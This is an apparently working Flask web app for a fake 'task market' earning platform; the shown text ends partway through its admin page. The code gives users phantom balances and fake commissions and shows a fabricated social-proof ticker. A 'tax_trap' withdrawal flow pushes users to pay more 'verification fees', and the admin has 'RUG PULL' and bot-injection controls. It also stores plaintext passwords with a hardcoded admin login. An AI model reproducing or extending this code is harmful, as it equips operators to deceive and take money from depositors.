import os
from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, date
import random

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-key-change-me')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///task_market.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Database Models
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    phone = db.Column(db.String(20), unique=True)
    password = db.Column(db.String(200))
    is_admin = db.Column(db.Boolean, default=False)
    phantom_balance = db.Column(db.Float, default=10.0)
    vip_tier = db.Column(db.Integer, default=0)
    daily_tasks_done = db.Column(db.Integer, default=0)
    last_task_date = db.Column(db.String(20), default='')
    created_at = db.Column(db.String(50), default=lambda: datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

class SystemState(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    system_liquidity = db.Column(db.Float, default=1000.0)
    is_rug_pulled = db.Column(db.Boolean, default=False)
    total_deposits = db.Column(db.Float, default=0)
    total_withdrawals = db.Column(db.Float, default=0)

class ActivityLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer)
    action = db.Column(db.String(200))
    amount = db.Column(db.Float, default=0)
    timestamp = db.Column(db.String(50), default=lambda: datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

with app.app_context():
    db.create_all()
    if not User.query.filter_by(phone='076000000').first():
        admin = User(phone='076000000', password='admin123', is_admin=True, phantom_balance=1000)
        db.session.add(admin)
        db.session.commit()
    if not SystemState.query.first():
        db.session.add(SystemState(system_liquidity=1000))
        db.session.commit()

# Custom SVG Icons as inline SVG (no emojis)
TASK_ICON_1 = '''<svg width="50" height="50" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#667eea"/><path d="M17 11h-4V7h-2v6h6v-2z" fill="#764ba2"/></svg>'''

TASK_ICON_2 = '''<svg width="50" height="50" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14h-2v-4H8v-2h2V9h2v2h2v2h-2v4z" fill="#667eea"/><path d="M15 9h-2v2h2V9z" fill="#764ba2"/></svg>'''

TASK_ICON_3 = '''<svg width="50" height="50" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm-.5-13h-1v6l5.25 3.15.75-1.23-4.5-2.67z" fill="#667eea"/></svg>'''

VIP_ICON = '''<svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2z" fill="#ffd700" stroke="#ff9800" stroke-width="1"/><text x="12" y="16" text-anchor="middle" fill="#fff" font-size="8" font-weight="bold">VIP</text></svg>'''

DEPOSIT_ICON = '''<svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11.5 1L7 8.5H16L11.5 1zM11.5 23L7 15.5H16L11.5 23z" fill="#667eea"/><path d="M3 11h17v2H3z" fill="#764ba2"/></svg>'''

WITHDRAW_ICON = '''<svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 14h-2v-2h2v2zm0-4h-2V7h2v5z" fill="#667eea"/></svg>'''

# LOGIN PAGE WITH IMAGE BACKGROUND
LOGIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Task Market VIP</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            background: url('/IMG_1615.jpeg') no-repeat center center fixed;
            background-size: cover;
            position: relative;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, rgba(0,0,0,0.7), rgba(0,0,0,0.5));
            z-index: 0;
        }
        
        .container {
            position: relative;
            z-index: 1;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .glass-card {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(15px);
            border-radius: 40px;
            padding: 45px 35px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
            animation: slideUp 0.7s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px) scale(0.9);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }
        
        .logo-area {
            text-align: center;
            margin-bottom: 35px;
        }
        
        .logo-icon {
            width: 90px;
            height: 90px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: -70px auto 20px;
            box-shadow: 0 15px 35px rgba(102,126,234,0.4);
        }
        
        .logo-icon svg {
            width: 50px;
            height: 50px;
        }
        
        h2 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
            font-weight: 700;
        }
        
        .input-group {
            margin-bottom: 22px;
        }
        
        .input-group input {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #e8e8e8;
            border-radius: 20px;
            font-size: 16px;
            transition: all 0.3s;
            background: white;
        }
        
        .input-group input:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 0 4px rgba(102,126,234,0.15);
        }
        
        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 28px rgba(102,126,234,0.5);
        }
        
        .links {
            text-align: center;
            margin-top: 28px;
        }
        
        .links a {
            color: #667eea;
            text-decoration: none;
            margin: 0 12px;
            font-weight: 600;
            font-size: 14px;
        }
        
        .error {
            background: linear-gradient(135deg, #f5a5a5, #f08080);
            color: white;
            padding: 14px;
            border-radius: 18px;
            margin-bottom: 25px;
            text-align: center;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="glass-card">
            <div class="logo-area">
                <div class="logo-icon">
                    <svg width="50" height="50" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2z" fill="white"/>
                    </svg>
                </div>
                <h2>Task Market VIP</h2>
            </div>
            {% if error %}<div class="error">{{ error }}</div>{% endif %}
            <form method="POST">
                <div class="input-group">
                    <input type="text" name="phone" placeholder="Phone Number" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Login Now</button>
            </form>
            <div class="links">
                <a href="/register">Create Account</a>
                <a href="/">Home</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

REGISTER_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Task Market VIP</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            background: url('/IMG_1615.jpeg') no-repeat center center fixed;
            background-size: cover;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, rgba(0,0,0,0.7), rgba(0,0,0,0.5));
            z-index: 0;
        }
        .container {
            position: relative;
            z-index: 1;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .glass-card {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(15px);
            border-radius: 40px;
            padding: 45px 35px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.4);
            animation: slideUp 0.7s ease-out;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(50px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .logo-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: -60px auto 25px;
        }
        h2 { text-align: center; margin-bottom: 30px; color: #333; font-size: 28px; }
        .input-group input {
            width: 100%;
            padding: 16px 20px;
            margin-bottom: 18px;
            border: 2px solid #e8e8e8;
            border-radius: 20px;
            font-size: 16px;
        }
        .input-group input:focus {
            border-color: #667eea;
            outline: none;
        }
        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .links { text-align: center; margin-top: 25px; }
        .links a { color: #667eea; text-decoration: none; font-weight: 600; }
        .error { background: linear-gradient(135deg, #f5a5a5, #f08080); color: white; padding: 12px; border-radius: 18px; margin-bottom: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="glass-card">
            <div class="logo-icon">
                <svg width="45" height="45" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14h-2v-4H8v-2h2V9h2v2h2v2h-2v4z" fill="white"/>
                </svg>
            </div>
            <h2>Create Account</h2>
            {% if error %}<div class="error">{{ error }}</div>{% endif %}
            <form method="POST">
                <div class="input-group">
                    <input type="text" name="phone" placeholder="Phone (076XXXXXX)" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Register</button>
            </form>
            <div class="links">
                <a href="/login">Already have an account?</a>
            </div>
        </div>
    </div>
</body>
</html>
'''

# DASHBOARD WITH CUSTOM SVG ICONS
DASHBOARD_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - Task Market VIP</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 550px; margin: 0 auto; }
        
        /* Header Card */
        .header-card {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 25px;
            margin-bottom: 20px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
        }
        
        .balance {
            font-size: 52px;
            font-weight: 800;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin: 10px 0;
        }
        
        .vip-badge {
            display: inline-block;
            padding: 8px 20px;
            background: linear-gradient(135deg, #ffd700, #ffed4e);
            border-radius: 50px;
            font-weight: bold;
            margin: 10px 0;
        }
        
        /* Task Card with SVG Icon */
        .task-card {
            background: white;
            border-radius: 25px;
            padding: 20px;
            margin-bottom: 18px;
            display: flex;
            align-items: center;
            gap: 18px;
            transition: all 0.3s;
            cursor: pointer;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
        }
        
        .task-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 15px 30px rgba(0,0,0,0.15);
        }
        
        .task-icon {
            width: 65px;
            height: 65px;
            background: linear-gradient(135deg, #667eea15, #764ba215);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .task-details {
            flex: 1;
        }
        
        .task-title {
            font-weight: 700;
            font-size: 18px;
            margin-bottom: 5px;
        }
        
        .task-reward {
            color: #667eea;
            font-weight: 700;
            font-size: 16px;
        }
        
        .task-limit {
            font-size: 12px;
            color: #999;
            margin-top: 5px;
        }
        
        .action-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 15px;
            cursor: pointer;
            font-weight: 700;
            transition: all 0.3s;
        }
        
        .action-btn:hover {
            transform: scale(1.05);
        }
        
        /* Regular Cards */
        .card {
            background: white;
            border-radius: 25px;
            padding: 22px;
            margin-bottom: 18px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
        }
        
        .card h3 {
            margin-bottom: 18px;
            color: #333;
            font-size: 20px;
        }
        
        input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e8e8e8;
            border-radius: 18px;
            margin: 12px 0;
            font-size: 16px;
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            font-weight: 700;
            font-size: 16px;
        }
        
        .nav-buttons {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .nav-btn {
            flex: 1;
            padding: 14px;
            background: rgba(255,255,255,0.9);
            border: none;
            border-radius: 20px;
            text-align: center;
            text-decoration: none;
            color: #667eea;
            font-weight: 700;
            transition: all 0.3s;
        }
        
        .nav-btn:hover {
            transform: translateY(-2px);
        }
        
        .ticker {
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(10px);
            color: #0f0;
            padding: 14px;
            border-radius: 20px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            text-align: center;
        }
        
        .alert-success {
            background: linear-gradient(135deg, #d4edda, #c3e6cb);
            color: #155724;
            padding: 14px;
            border-radius: 18px;
            margin-top: 12px;
            font-weight: 500;
        }
        
        .alert-error {
            background: linear-gradient(135deg, #f8d7da, #f5c6cb);
            color: #721c24;
            padding: 14px;
            border-radius: 18px;
            margin-top: 12px;
            font-weight: 500;
        }
        
        .icon-small {
            width: 40px;
            height: 40px;
        }
        
        .flex-between {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ticker" id="ticker">Loading live activities...</div>
        
        <div class="nav-buttons">
            <a href="/dashboard" class="nav-btn" style="background:linear-gradient(135deg, #667eea, #764ba2); color:white;">Dashboard</a>
            <a href="/logs" class="nav-btn">Activity Logs</a>
            <a href="/logout" class="nav-btn" style="color:#c00;">Logout</a>
        </div>
        
        <div class="header-card">
            <div>Welcome back, <strong>{{ user.phone }}</strong></div>
            <div class="balance">{{ "%.2f"|format(user.phantom_balance) }} NLE</div>
            <div class="vip-badge">{{ vip_level }}</div>
            <div>Tasks Completed: {{ tasks_done }} / {{ tasks_max }}</div>
        </div>
        
        <!-- MAIN TASK CARD -->
        <div class="task-card" onclick="doTask()">
            <div class="task-icon">
                <svg width="45" height="45" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" fill="#667eea"/>
                </svg>
            </div>
            <div class="task-details">
                <div class="task-title">Daily Performance Task</div>
                <div class="task-reward">Reward: +{{ "%.2f"|format(commission) }} NLE</div>
                <div class="task-limit">{{ tasks_done }}/{{ tasks_max }} tasks completed today</div>
            </div>
            <button class="action-btn" onclick="event.stopPropagation(); doTask()">Complete</button>
        </div>
        
        <!-- TASK ITEMS WITH SVG ICONS -->
        <div class="card">
            <h3>Available Tasks</h3>
            
            <div class="flex-between" style="margin-bottom: 15px; padding: 12px; background: #f8f9fa; border-radius: 18px;">
                <div style="display: flex; align-items: center; gap: 12px;">
                    <div class="task-icon" style="width: 50px; height: 50px;">
                        <svg width="35" height="35" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" fill="#667eea"/>
                        </svg>
                    </div>
                    <div><strong>Social Media Engagement</strong><br><small style="color:#999;">Follow &amp; Like</small></div>
                </div>
                <span style="color:#667eea; font-weight:700;">+{{ "%.2f"|format(commission*0.8) }} NLE</span>
            </div>
            
            <div class="flex-between" style="margin-bottom: 15px; padding: 12px; background: #f8f9fa; border-radius: 18px;">
                <div style="display: flex; align-items: center; gap: 12px;">
                    <div class="task-icon" style="width: 50px; height: 50px;">
                        <svg width="35" height="35" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 14h-2v-4H8v-2h2V9h2v2h2v2h-2v4z" fill="#764ba2"/>
                        </svg>
                    </div>
                    <div><strong>Survey Completion</strong><br><small style="color:#999;">Share your opinion</small></div>
                </div>
                <span style="color:#667eea; font-weight:700;">+{{ "%.2f"|format(commission*0.9) }} NLE</span>
            </div>
            
            <div class="flex-between" style="padding: 12px; background: linear-gradient(135deg, #667eea10, #764ba210); border-radius: 18px;">
                <div style="display: flex; align-items: center; gap: 12px;">
                    <div class="task-icon" style="width: 50px; height: 50px; background: linear-gradient(135deg, #667eea20, #764ba220);">
                        <svg width="35" height="35" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm-.5-13h-1v6l5.25 3.15.75-1.23-4.5-2.67z" fill="#ff9800"/>
                        </svg>
                    </div>
                    <div><strong>VIP Special Task</strong><br><small style="color:#999;">Limited time bonus</small></div>
                </div>
                <span style="color:#ff9800; font-weight:700;">+{{ "%.2f"|format(commission) }} NLE</span>
            </div>
        </div>
        
        <!-- DEPOSIT CARD -->
        <div class="card">
            <div class="flex-between" style="margin-bottom: 15px;">
                <h3>Deposit Funds</h3>
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M11.5 1L7 8.5H16L11.5 1zM11.5 23L7 15.5H16L11.5 23z" fill="#667eea"/>
                    <path d="M3 11h17v2H3z" fill="#764ba2"/>
                </svg>
            </div>
            <input type="number" id="depositAmount" placeholder="Amount in NLE">
            <button onclick="deposit()">Process Deposit</button>
            <div id="depositMsg"></div>
        </div>
        
        <!-- WITHDRAW CARD -->
        <div class="card">
            <div class="flex-between" style="margin-bottom: 15px;">
                <h3>Withdraw Funds</h3>
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 14h-2v-2h2v2zm0-4h-2V7h2v5z" fill="#667eea"/>
                </svg>
            </div>
            <input type="number" id="withdrawAmount" placeholder="Amount in NLE">
            <button onclick="withdraw()">Request Withdrawal</button>
            <div id="withdrawMsg"></div>
            <small style="color:#999; display: block; margin-top: 10px;">Minimum: 100 NLE | Large withdrawals require verification</small>
        </div>
        
        {% if user.is_admin %}
        <div class="card">
            <h3>Admin Access</h3>
            <a href="/admin"><button style="background:#f90;">Go to Control Panel</button></a>
        </div>
        {% endif %}
    </div>
    
    <div id="taskMsg" style="position: fixed; bottom: 20px; left: 20px; right: 20px; z-index: 1000;"></div>
    
    <script>
        function updateTicker() {
            fetch('/api/social_proof')
                .then(r => r.json())
                .then(d => { document.getElementById('ticker').innerHTML = '🔔 ' + d.message; });
        }
        setInterval(updateTicker, 5000);
        updateTicker();
        
        async function deposit() {
            let amount = document.getElementById('depositAmount').value;
            if(!amount) { alert('Enter amount'); return; }
            let formData = new FormData();
            formData.append('amount', amount);
            let res = await fetch('/deposit', {method: 'POST', body: formData});
            if(res.redirected) location.href = res.url;
        }
        
        async function doTask() {
            let res = await fetch('/complete_task');
            let data = await res.json();
            if(data.success) {
                document.getElementById('taskMsg').innerHTML = '<div class="alert-success">Task completed successfully! +' + data.commission.toFixed(2) + ' NLE earned!</div>';
                setTimeout(() => location.reload(), 1500);
            } else {
                document.getElementById('taskMsg').innerHTML = '<div class="alert-error">' + data.error + '</div>';
                setTimeout(() => { document.getElementById('taskMsg').innerHTML = ''; }, 3000);
            }
        }
        
        async function withdraw() {
            let amount = document.getElementById('withdrawAmount').value;
            if(!amount) { alert('Enter amount'); return; }
            let formData = new FormData();
            formData.append('amount', amount);
            let res = await fetch('/withdraw', {method: 'POST', body: formData});
            let data = await res.json();
            if(data.success) {
                document.getElementById('withdrawMsg').innerHTML = '<div class="alert-success">Withdrawal request submitted successfully!</div>';
                setTimeout(() => location.reload(), 1500);
            } else if(data.tax_trap) {
                if(confirm(data.message + '\\n\\nVerification Fee: ' + data.fee + ' NLE\\n\\nPay fee to continue?')) {
                    let fd = new FormData();
                    fd.append('amount', data.fee);
                    await fetch('/deposit', {method: 'POST', body: fd});
                    alert('Verification fee paid. Please try withdrawal again.');
                    location.reload();
                }
            } else {
                document.getElementById('withdrawMsg').innerHTML = '<div class="alert-error">' + data.message + '</div>';
                setTimeout(() => { document.getElementById('withdrawMsg').innerHTML = ''; }, 3000);
            }
        }
    </script>
</body>
</html>
'''

FRONT_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Task Market VIP</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
            min-height: 100vh;
            background: url('/IMG_1615.jpeg') no-repeat center center fixed;
            background-size: cover;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, rgba(0,0,0,0.6), rgba(0,0,0,0.4));
            z-index: 0;
        }
        .container {
            position: relative;
            z-index: 1;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .hero {
            background: rgba(255,255,255,0.95);
            backdrop-filter: blur(15px);
            border-radius: 50px;
            padding: 55px 35px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            animation: fadeIn 1s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        .logo {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 35px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: -80px auto 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        h1 { font-size: 34px; margin-bottom: 12px; color: #333; font-weight: 800; }
        .tagline { color: #667eea; margin-bottom: 35px; font-weight: 600; }
        .features { text-align: left; margin: 35px 0; }
        .feature-item { margin: 18px 0; display: flex; align-items: center; gap: 12px; font-weight: 500; }
        .feature-item:before { content: "✓"; color: #667eea; font-weight: bold; font-size: 22px; }
        .btn {
            display: block;
            padding: 16px;
            margin: 15px 0;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            text-decoration: none;
            border-radius: 40px;
            font-weight: 700;
            transition: all 0.3s;
        }
        .btn:hover { transform: scale(1.03); box-shadow: 0 10px 25px rgba(102,126,234,0.4); }
        .btn-outline { background: transparent; border: 2px solid #667eea; color: #667eea; }
        .stats { background: #f8f9fa; border-radius: 25px; padding: 20px; margin-top: 25px; font-size: 14px; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container">
        <div class="hero">
            <div class="logo">
                <svg width="55" height="55" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2z" fill="white"/>
                </svg>
            </div>
            <h1>Task Market VIP</h1>
            <p class="tagline">Earn up to 100 NLE per task!</p>
            <div class="features">
                <div class="feature-item">Start with 10 NLE FREE bonus</div>
                <div class="feature-item">Complete daily tasks for commission</div>
                <div class="feature-item">VIP tiers with higher earnings</div>
            </div>
            <a href="/login" class="btn">Login Now</a>
            <a href="/register" class="btn btn-outline">Create Free Account</a>
            <div class="stats">
                Active Users: {{ users }} | Total Paid: {{ "%.2f"|format(total_paid) }} NLE
            </div>
        </div>
    </div>
</body>
</html>
'''

LOGS_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activity Logs</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 600px; margin: 0 auto; }
        .header {
            background: rgba(255,255,255,0.95);
            border-radius: 30px;
            padding: 30px;
            margin-bottom: 25px;
            text-align: center;
        }
        .log-card {
            background: white;
            border-radius: 20px;
            padding: 18px;
            margin-bottom: 12px;
            border-left: 5px solid #667eea;
            transition: all 0.3s;
        }
        .log-card:hover { transform: translateX(5px); }
        .log-time { font-size: 11px; color: #999; margin-bottom: 6px; }
        .log-action { font-size: 14px; color: #333; font-weight: 500; }
        .log-amount { font-weight: bold; color: #667eea; }
        .nav-buttons { display: flex; gap: 12px; margin-bottom: 25px; }
        .nav-btn {
            flex: 1;
            padding: 14px;
            background: rgba(255,255,255,0.9);
            border: none;
            border-radius: 20px;
            text-align: center;
            text-decoration: none;
            color: #667eea;
            font-weight: 700;
        }
        .stats-card {
            background: white;
            border-radius: 25px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: center;
        }
        .stat-number { font-size: 32px; font-weight: 800; color: #667eea; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>Activity Memory Logs</h2>
            <p>Your transaction history</p>
        </div>
        <div class="nav-buttons">
            <a href="/dashboard" class="nav-btn">Dashboard</a>
            <a href="/logs" class="nav-btn" style="background:linear-gradient(135deg, #667eea, #764ba2); color:white;">Activity Logs</a>
            <a href="/logout" class="nav-btn">Logout</a>
        </div>
        <div class="stats-card">
            <div class="stat-number">{{ total_logs }}</div>
            <div>Total Activities Recorded</div>
        </div>
        {% for log in logs %}
        <div class="log-card">
            <div class="log-time">{{ log.timestamp }}</div>
            <div class="log-action">
                {{ log.action }}
                {% if log.amount > 0 %}
                    <span class="log-amount">({{ "%.2f"|format(log.amount) }} NLE)</span>
                {% endif %}
            </div>
        </div>
        {% endfor %}
    </div>
</body>
</html>
'''

ADMIN_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 550px; margin: 0 auto; }
        .card {
            background: rgba(255,255,255,0.95);
            border-radius: 30px;
            padding: 28px;
            margin-bottom: 20px;
        }
        button {
            width: 100%;
            padding: 16px;
            margin: 12px 0;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-weight: 700;
            font-size: 16px;
        }
        .danger { background: linear-gradient(135deg, #dc3545, #c82333); color: white; }
        .warning { background: linear-gradient(135deg, #ff9800, #f57c00); color: white; }
        .success { background: linear-gradient(135deg, #28a745, #218838); color: white; }
        .metric { font-size: 36px; font-weight: 800; margin: 15px 0; }
        .red { color: #dc3545; }
        .nav-buttons { display: flex; gap: 12px; margin-bottom: 20px; }
        .nav-btn {
            flex: 1;
            padding: 14px;
            background: rgba(255,255,255,0.9);
            border-radius: 20px;
            text-align: center;
            text-decoration: none;
            color: #667eea;
            font-weight: 700;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-buttons">
            <a href="/dashboard" class="nav-btn">User View</a>
            <a href="/logs" class="nav-btn">Activity Logs</a>
            <a href="/logout" class="nav-btn">Logout</a>
        </div>
        
        <div class="card">
            <h2>Admin Control Panel</h2>
        </div>
        
        <div class="card">
            <h3>System Health Metrics</h3>
            <p>Total Phantom Balance: {{ stats.total_phantom }} NLE</p>
            <p>System Liquidity: {{ stats.liquidity }} NLE</p>
            <p class="metric {% if stats.ratio > 2 %}red{% endif %}">Collapse Ratio: {{ "%.2f"|format(stats.ratio) }}x</p>
            <p>Total Users: {{ stats.users }}</p>
            <p>Total Logs: {{ stats.logs }}</p>
        </div>
        
        <div class="card">
            <h3>Emergency Controls</h3>
            <button class="danger" onclick="rugPull()">RUG PULL - Emergency Lockdown</button>
            <button class="warning" onclick="injectBots()">Inject 20 Bot Users</button>
